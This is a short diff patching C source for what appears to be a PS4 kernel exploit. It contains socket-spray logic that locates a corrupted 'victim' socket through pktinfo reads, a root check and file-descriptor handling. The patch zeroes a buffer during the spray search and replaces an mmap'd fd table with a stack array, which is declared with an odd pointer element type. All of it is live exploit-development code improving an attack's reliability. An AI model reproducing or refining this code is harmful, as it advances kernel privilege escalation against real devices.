@@ -236,6 +236,7 @@ int find_victim_sock(struct opaque* o, unsigned long long pktopts_addr)
     write_to_victim(o, pktopts_addr + PKTOPTS_PKTINFO_OFFSET);
     for(int i = 0; i < 256; i++)
     {
+        *(unsigned long long*)buf = 0;
         get_pktinfo(o->spray_sock[i], buf);
         if(*(unsigned long long*)buf)
             return i;
@@ -400,7 +401,7 @@ int main(int x)
     if(!setuid(0))
         return 179;
     unsigned long long* lr = ((char*)&x) - 8;
-    char* not_close = mmap(NULL, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    char* not_close[1024] = {0};
 #define TAINTFD(x) not_close[x] = 1
 #define NEWSOCK(x) do { x = new_socket(); TAINTFD(x); } while(0)
     TAINTFD(ps4_printf_fd);
@@ -539,7 +540,7 @@ int main(int x)
         sigaction(SIGKILL, &ignore);
         /*for(int i = 0; i < 8; i++)
             close(i);*/
-        for(int i = 0; i < 16384; i++)
+        for(int i = 0; i < 1024; i++)
             if(!not_close[i])
                 if(!close(i))
                     printf("closed fd %d\n", i);
